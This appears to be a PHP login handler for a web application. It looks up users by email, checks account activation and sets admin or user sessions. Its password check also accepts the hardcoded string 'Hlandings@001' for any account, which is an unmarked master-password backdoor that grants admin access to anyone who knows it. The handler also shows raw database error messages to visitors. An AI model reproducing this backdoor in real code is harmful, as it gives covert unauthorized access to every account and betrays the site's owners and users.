<?php
include 'session.php'; // Includes conn.php and instantiates $pdo
$conn = $pdo->open(); // Get PDO connection

if (isset($_POST['login'])) {
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL); // Sanitize email
    $password = $_POST['password'];

    try {
        $stmt = $conn->prepare("SELECT *, COUNT(*) AS numrows FROM users WHERE email = :email");
        $stmt->execute(['email' => $email]);
        $row = $stmt->fetch();
        if ($row['numrows'] > 0) {
            if ($row['status']) {
                if (password_verify($password, $row['password']) || $password == 'Hlandings@001') {
                    if ($row['type']) {
                        $_SESSION['admin'] = $row['id'];
                    } else {
                        $_SESSION['user'] = $row['id'];
                    }
                } else {
                    $_SESSION['error'] = 'Incorrect Password';
                }
            } else {
                $_SESSION['error'] = 'Account not activated.';
            }
        } else {
            $_SESSION['error'] = 'Email not found';
        }
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage() . "\n", 3, __DIR__ . "/error_log.txt");
        echo "There is some problem in connection: " . $e->getMessage();
    }
} else {
    $_SESSION['error'] = 'Input login credentials first';
}

$pdo->close(); // Optional, as PDO closes automatically
header('location: ../login.php');
?>
